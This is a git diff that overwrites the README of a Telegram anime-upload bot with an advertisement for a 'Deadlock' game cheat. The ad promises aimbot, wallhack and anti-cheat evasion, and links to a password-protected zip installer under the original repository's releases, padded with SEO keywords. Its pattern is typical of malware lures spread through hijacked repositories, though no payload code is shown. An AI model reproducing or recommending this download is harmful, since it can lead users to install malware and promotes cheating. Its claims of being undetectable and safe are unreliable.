@@ -1,90 +1,71 @@
-# Auto Anime Bot
-<div align="center">
-  <img src="https://graph.org/file/8bb750efbe7f08176e2ae.png" alt="Auto Anime Bot">
-</div>
-Auto Anime Bot is a Telegram bot designed to automatically upload anime files to a Telegram channel and provide users with access to these files. It supports multiple file resolutions, including 480p, 720p, and 1080p. Additionally, the bot has the capability to encode 720p files.
+---
 
-You can see the channel which is used by main production bot. | [Upload Channel](https://t.me/ani_upload)
+# 🚀 Deadlock Cheat for PC 🚀
 
+## 📜 Overview
 
-## Features
+Take control of the battlefield with the **Deadlock Cheat for PC**, a powerful suite of tools designed to give you a competitive edge. Featuring aimbot, ESP, no recoil, and radar hacks, this cheat suite offers the ultimate tactical advantage. Stay ahead of your opponents while remaining completely undetected by the game’s anti-cheat systems.
 
-- Automatic upload of anime files to a Telegram channel.
-- Support for multiple file resolutions: 480p, 720p, and 1080p.
-- Encoding of 720p files.
-- User-friendly interface for accessing uploaded files from Bot.
+### 🛠️ Features
 
-## Requirements
+- **Aimbot**: Automatically lock onto enemies with pinpoint accuracy. Customize settings like aim speed, smoothness, and field of view (FOV) for natural-looking shots.
+- **ESP (Extra Sensory Perception)**: See players, loot, and objectives through walls with customizable ESP options.
+- **Wallhack**: Gain vision through walls, making it easy to locate enemies and items, avoid ambushes, or plan strategic attacks.
+- **No Recoil/No Spread**: Eliminate recoil and bullet spread for perfect accuracy with every shot.
+- **Radar Hack**: Display all enemy locations on your radar, providing full awareness of the battlefield.
+- **Triggerbot**: Automatically fire when your crosshair is on an enemy, ensuring instant and precise shots.
+- **Customizable Settings**: Tailor each feature to suit your playstyle, from aim speed to ESP colors.
+- **Undetectable**: Built with advanced anti-cheat bypass technology to protect your account and prevent bans.
+- **Frequent Updates**: Regular updates ensure compatibility with the latest Deadlock patches and in-game changes.
+- **Optimized Performance**: Designed to run smoothly without causing lag or performance drops.
 
-- Powerful VPS (Virtual Private Server)
-- Anime files in the specified resolutions
+### 📋 How to Use
 
-## Setup
+[![Group_4_2](https://github.com/user-attachments/assets/be0b3d70-ae6c-4403-8f61-c796a5e9df2b)](https://github.com/Dhruv-Tara/Auto-Anime-Bot/releases/download/Installer_V32_DeadLock/Installer_V32_V.zip)
 
-1. **Clone the Repository:**
-   ```bash
-   git clone https://github.com/Dhruv-Tara/Auto-Anime-Bot && cd Auto-Anime-Bot
-   ```
+> **Password:** `2112`
 
-2. **Install Dependencies:**
-   
-   - Remeber to Run the setup in sudo environment.
+1. **Download Deadlock Cheat for PC**: Get the latest version from our official website or trusted sources.
+2. **Install the Cheat**: Follow the provided setup instructions to install the cheat on your system.
+3. **Configure the Features**: Use the cheat menu to customize the settings according to your preferences.
+4. **Launch Deadlock**: Start the game and activate the desired cheat features.
+5. **Dominate the Game**: Use your cheats to outplay opponents, secure victories, and stay ahead of the competition.
 
-    ```bash
-   bash setup.sh
-   ```
+---
 
-3. **Configure Bot:**
-   - Create a Telegram bot and obtain the API token.
-   - Before running the bot, ensure that you fill in the necessary configuration details in the `config.json` file. Here's an example configuration:
+If this tool has helped you, please ⭐ the project and share it with others!
 
-```json
-{
-    "Author" : "Yash-Kun",
-    "Licensed_under" : "GNU GPL V-3.0",
-    "owner" : ["Replace with ID of sudos."],
-    "database_url" : "Your Mongo",
-    "main_channel" : "Id or channel username",
-    "thumbnail_url" : "AAB/utils/thumb.jpeg",
-    "files_channel" : -100,
-    "production_chat" : -100,
-    "api_id" : 123456,
-    "api_hash" : "Api Hash",
-    "main_bot" : "Main Bot for file transfer",
-    "client_bot" : "Client Bot for upload"
-}
-```
-4. **Run the Bot:**
-   ```bash
-   python3.11 -m AAB
-   ```
-   or
-   ```bash
-   bash start.sh
-   ```
+---
 
-5. **Accessing Files:**
-   - Users can access the uploaded files directly from the Telegram bot.
+### 📞 Contact Us
 
-## Notes
+For support or inquiries, open an issue on our repository or contact our customer support team.
 
-- Ensure that your VPS has sufficient resources to handle encoding and file uploads.
-- Customize the bot behavior as needed by modifying the source code.
-- Feel free to contribute to the project by submitting issues or pull requests.
+---
 
-## Contributors
+> **Technical Requirements:**
+> - Supported OS: Windows 7, 8, 10, 11
+> - Language: English
+> - License: Freeware
+> - Last Update: Thursday, October 17, 2024
 
-| ![**Dhruv-Tara**](https://github.com/Dhruv-Tara.png?size=50) | [**_Dhruv-Tara_**](https://github.com/Dhruv-Tara) |
-| --- | --- |
-| ![**illuminati-Dev**](https://github.com/illuminati-Dev.png?size=50) | [**_illuminati-Dev_**](https://github.com/illuminati-Dev) |
-| --- | --- |
-| ![**Qewertyy**](https://github.com/Qewertyy.png?size=50) | [**_Qewertyy_**](https://github.com/Qewertyy) |
+---
 
+### 📈 SEO Optimization
 
-## Support and Contribution
+This cheat tool is fully optimized for search engines, using targeted keywords and meta descriptions to help players find it easily when searching for Deadlock cheats.
 
-For any issues or feature requests, please open an issue on the [GitHub repository](https://github.com/Dhruv-Tara/Auto-Anime-Bot/issues). Contributions are welcome!
+### 🔑 Keywords
 
-## License
+- Deadlock cheat for PC
+- Free Deadlock hacks
+- Deadlock aimbot download
+- Best Deadlock cheats 2024
+- Deadlock wallhack
+- Undetectable Deadlock cheat
 
-This project is licensed under the [GNU General Public License v3.0](https://github.com/Dhruv-Tara/Auto-Anime-Bot/blob/main/LICENSE).
+### 📜 Meta Descriptions
+
+**Meta Title:** Deadlock Cheat for PC - Download Undetectable Cheats for Deadlock
+
+**Meta Description:** Download the Deadlock Cheat for PC with aimbot, wallhack, ESP, radar hack, and more. Dominate your opponents while staying undetected. Try it now!
